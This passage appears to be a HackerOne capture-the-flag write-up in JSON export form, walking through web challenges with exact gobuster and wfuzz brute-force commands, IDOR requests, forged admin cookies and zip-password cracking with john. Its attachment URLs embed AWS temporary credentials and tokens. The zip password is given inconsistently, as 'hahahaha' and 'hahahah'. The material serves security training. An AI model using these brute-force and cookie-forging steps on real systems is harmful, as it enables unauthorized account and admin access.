mz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=485172257081472aa79f99024971b6ea5c439f526f0686132c3b08fdfe80b8c2"},{"id":1140133,"filename":"double_sql.py","type":"text/x-python","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dh9zqvqkjg39uysh6jitr37pkiin?response-content-disposition=attachment%3B%20filename%3D%22double_sql.py%22%3B%20filename%2A%3DUTF-8%27%27double_sql.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=cb23c081deedf1400c03a72879bd716e3da4befa6399ed803f8588755d59d6ee"},{"id":1140134,"filename":"ssrf.py","type":"text/x-python","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7d8yhalw4vqy1ajdov899xc1kjc8?response-content-disposition=attachment%3B%20filename%3D%22ssrf.py%22%3B%20filename%2A%3DUTF-8%27%27ssrf.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8995b49804bc40cf7fcdad3a60c1ad10f95f11d615eb181fe6a8d938106ebe7f"},{"id":1140135,"filename":"hash_target.py","type":"text/x-python","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tv8qbmvu4oxnpse3w0eedfzlus5q?response-content-disposition=attachment%3B%20filename%3D%22hash_target.py%22%3B%20filename%2A%3DUTF-8%27%27hash_target.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ecae79d1ca7d37f71c4eb37806337888ab0d4ba5992ad12024806bb05c743f26"},{"id":1140136,"filename":"characters.txt","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/68ahqrbd954rb6dod4vm8omqmr25?response-content-disposition=attachment%3B%20filename%3D%22characters.txt%22%3B%20filename%2A%3DUTF-8%27%27characters.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=705ffcfc7580ea4262370f705c75a2a6c0812bf60071f8cec28ca38ac4512073"},{"id":1140069,"filename":"Screenshot_from_2020-12-31_20-40-18.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sdu877tklwl9cxexcq86qbkifeye?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_20-40-18.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_20-40-18.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=626f3c73977cfbd77859420644faf0b70b6bd6aa6d89ab5bbb1c532009e66de9"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10245762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Executive Summary:\nThis year Mr Grinch has gone hi-tech and decided to ruin our Christmas, but thanks to a threat intelligence team we have got to know his intentions and therefore we put up a special Incident Response team just for this case. After a couple of days of hard work, the IR team successfully infiltrated his network and took him down just right on Christmas eve. \n\n# Technical Summary:\nDuring the assessment IR team identified and exploited the following weaknesses and vulnerabilities:\n1. Information Disclosure through files for web crawlers\n2. Information Disclosure through javascript files\n3. Insecure direct object reference\n4. Information Disclosure due to lack of Authentication control\n5. User Enumeration and Password Enumeration due to descriptive messages. Weak credentials\n6. Source code exposure. Weak filter bypass that leads to PHP LFI.\n7. Directory listing and SSTI\n8. Source code leakage with secrets through an open git repository. Weak password usage.\n9. Second-order SQL Injection\n10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privileges.\n11. Double SQL Injection and Path Traversal\n12. Insecure cryptographic salt usage. The predictive  algorithm used. DNS Rebinding attack\n\n\n# Detailed explanation of issues and walk through:\n\n## 1.  Information Disclosure through files for web crawlers\nThe default web crawler files like robots.txt or humans.txt sometimes may contain valuable to attackers information (e.g. hidden directories, which are difficult to brute force).\n### Steps to reproduce\n  * Launch the following command            \n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 80 -x txt,php\n```\n  * In the output you should be able to find robots.txt\n  * Open a browser and navigate to the following link https://hackyholidays.h1ctf.com/robots.txt\n{F1140069}\n\n### Key takeaways\nIn the real world, it is not an issue on its own and would definitely need a context in order to be a valid security issue. It might be used in a chain of vulnerabilities/missing of best practices and weaknesses.\n\n## 2.  Information Disclosure through javascript files\nSometimes developers modify legacy Javascript code for debugging purposes, but they tend to forget to remove it before the release. The issue sometimes may lead to information disclosure of sensitive content, the same as it was in our story. IR team followed the hidden link `/s3cr3t-ar3a` and discovered that `assets/js/jquery.min.js` was modified and it contained the code that printed sensitive flag in the HTML document.\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a\n  * Press Ctrl+U . HTML source code should be shown. \n  * Now find a script `/assets/js/jquery.min.js`\n  * Download the script using this command `wget https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`\n  * unminify the js code by using this command: `js-beautify -o jquery.js jquery.min.js`\n  * Look at the first 50 lines of the file: `head -n 50 jquery.js`\n  * Find references to h1_0, h1_2 variables. After analysing this piece of code we understand that we have to look for `alertbox` on the page using developer tools. Alternatively, we can change JS code a bit and execute it in order to get the flag,\n  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a again\n  * Open Developer Tools by pressing Ctrl+Schift+I \n  * Click on Inspector on the Developer Tools toolbar, and try to search for `#alertbox`\n  * We should be able to find our flag data-info parameter. \n\n{F1140070}\n\n### Supporting Material/References:\n\n### Key takeaways\nIn the real world, it is pretty common to find and analyze JS files, especially those which are custom. A tool such as js-beautify and a mindset for finding interesting or strange code is essential for such weaknesses. \n\n## 3. Insecure direct object reference\nAfter navigating to https://hackyholidays.h1ctf.com/apps, which was a hinted location in the JS file at the second stage, we find eight different buttons. Each button is a link to another mini-app that IR team had to crack during the hunt for a secret area portal. The first target was people-rater mini-app. \n\nAfter navigating to https://hackyholidays.h1ctf.com/people-rater , IR Team intercepted two GET requests. One of them was representing `/people-rater/page/1` and the second one was `people-rater/entry?id=eyJpZCI6Mn0=`. The first endpoint was returning JSON file with a list of `{\"id\":\"base64_encoded_value\", name:\"Name\"}`. Then the Team had to enumerate each page by increasing and decreasing the number in the request. Thanks to that it became evident that `/people-rater/page/1` is the first page. \n\nSecondly, IRT decoded the first base64 encoded value `eyJpZCI6Mn0=` , which contained `{\"id\":2}`. After that the logic was simple - we had to send a base64 encoded value of  `{\"id\":1}` to `people-rater/entry?id=` \n\n### Steps to reproduce\n  * Set up a proxy like Burp Suite or ZAP\n  * Navigate to https://hackyholidays.h1ctf.com/people-rater\n  * Go to the Burp Suite. Find the request to `/people-rater/page/0`\n{F1140071}\n  * Base64 decode `eyJpZCI6Mn0=`. You should get `{\"id\":2}`\n{F1140072}\n  * Decrease the id by 1 and base64 encode it. You should get `eyJpZCI6MX0=`\n  * Now send a GET request to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=\n{F1140073}\n\n### Key takeaways\nAlways look into each parameter and assume something may be hidden\n\n## 4. Information Disclosure due to lack of Authentication control\nAs always, the first step was to study the app itself. The app had an interesting functionality that s\net a `token` cookie when the user entered a valid username and password that led us to look into\nhow we could sing in.\n\nThe default endpoint bruteforce gave us a few endpoints, such as `/api/purchase` and `/api/sessions`. But in order to discover all endpoints a negative status code filter should have been used. This interesting technique gave us another endpoint - `/api/user`, which returned a 400 error.\n\nThe `/api/sessions` endpoint returned a list of sessions, where only one was interesting. And thanks\nto what we discovered before, we knew that it should be used inside a `token` cookie.\n\nBut it wasn't the end, so that's why we decided to brute-force parameters on `/api/user`, and that gav\ne us an `uuid` parameter, the same parameter which was found in session, so all we had to do in order\n to get a flag is to send a request to `/api/user` endpoint with a session token in a cookie and a parameter `uuid` which value was taken from the session token.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/swag-shop\n  * Find request to api endpoints and initiate a scan of the api endpoint. (don't forget to change the directory)\n\n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 60 -b 404\n```\n\n{F1140075}\n  * Got to the Burp Suite, do a request to swag-shop/api/user\n\n```\nGET /swag-shop/api/user HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1GET\n```\n\n  * Then bruteforce a parameter on /swag-shop/api/user endpoint\n\n```\nwfuzz --hc 400 -w ~/Tools/lists/SecLists/Discovery/Web-Content/burp-parameter-names.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1\n```\n\n   * Do a GET request to swag-shop/api/sessions  and find a list of sessions. copy the third one (the longest)\n\n```\neyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\n```\n\n{F1140076}\n   * Decode the longest session token. It should decode to \n\n```\n{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"}\n```\n   * The place a token to a Cookie header `Cookie: token=[TOKEN]` and copy UUID from the token and place it into `uuid` parameter. Send the request.\n\n```\nGET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: token=eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\nReferer: https://hackyholidays.h1ctf.com/apps\nUpgrade-Insecure-Requests: 1\n```\n\n{F1140077}\n\n### Supporting Material/References:\n\n### Key takeaways\nSometimes one should fuzz using a negative match, not just a default setup.\n\n\n## 5. User Enumeration and Password Enumeration due to descriptive messages. Weak credential\nThis app had a strange error saying `Invalid Username` when we tried to log in, that's why we decided to brute-force the usernames and hope that the app would return another descriptive error for a password. Here it should be noted that mostly everyone fell in a trap by not assuming that `Invalid Username` and `Invalid Password` have the same length.\n\nIndeed it if you brute force by first filtering out `Invalid Username` and then filtering out `Invalid\nPassword` - you get `access:computer`.\n\nAfter successfully signing in, the server issued a `securelogin` cookie that contained a base64 encoded value of a cookie parameter and admin parameter, which was set to false. Apparently, no checks were implemented, and just by changing `\"admin\":false` to `\"admin\":true` did the trick and we became an admin.\n\nOn the admin page we found a zip file accessible for download. Unfortunately, it was password protected, but a tool like `zip2john` helped to get a hash of the password ready for a brute-force using `john\n`. The password is easy - `hahahaha`. Using it, we unzipped a zip file and got a flag.\n\n\n### Steps to reproduce\n  * Navigate to  and send a login request using username: user and password pass. Observe a descriptive error `Invalid Username`\n  * Start a username brute-force attack. You should get a username: access\n\n```\nwfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Usernames/Names/names.txt -d 'username=FUZZ\u0026password=pass' --hs 'Invalid\\ Username'\n```\n\n{F1140086}\n  * Go to the login page in the browser again and send a login request using username: access and password pass. Observe a descriptive error `Invalid Password`\n  * Start a password brute-force attack. You should get a password: computer\n\n```\nwfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -d 'username=access\u0026password=FUZZ' --hs 'Invalid\\ Password'\n```\n\n  * Intercept requests using Burp Suite, go the login page and authenticate youself using `access` as a username and `computer` as a password.\n  * Send that request to Repeater and send it to the host again. You should get a redirect with setting a cookie\n\n```\nSet-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;\n```\n\n  * URL- and base64- decode the cookie and you should get\n\n```\n{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}\n```\n\n  * Change admin parameter to `true`, url- and base64- decode the cookie. After that send a GET request to /secure-login with the new cookie.\n\n```\nGET /secure-login HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://hackyholidays.h1ctf.com/secure-login\nConnection: close\nCookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d\nUpgrade-Insecure-Requests: 1\n\n```\n\n{F1140085}\n  * In the Response you can find a link to `/my_secure_files_not_for_you.zip` file\n  * Grab ZIP file - https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip\n  * If you try to open with the old password - you'll fail. So we have to use `john2zip` in order to create a hash, that we will brute\n\n```\n~/Tools/john/run/zip2john my_secure_files_not_for_you.zip \u003e encrypted.zip.hash\n```\n\n  * Then execute the actual brute-force command\n\n```\n~/Tools/john/run/john encrypted.zip.hash --wordlist=/home/strawberry/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt\n```\n\n  * The password that you'll get is - `hahahah`. Use it to open either using GUI or using this command\n\n```\nunzip unzip my_secure_files_not_for_you.zip\n```\n\n  * cat the flag.txt. Note it's better not to see xxx.png 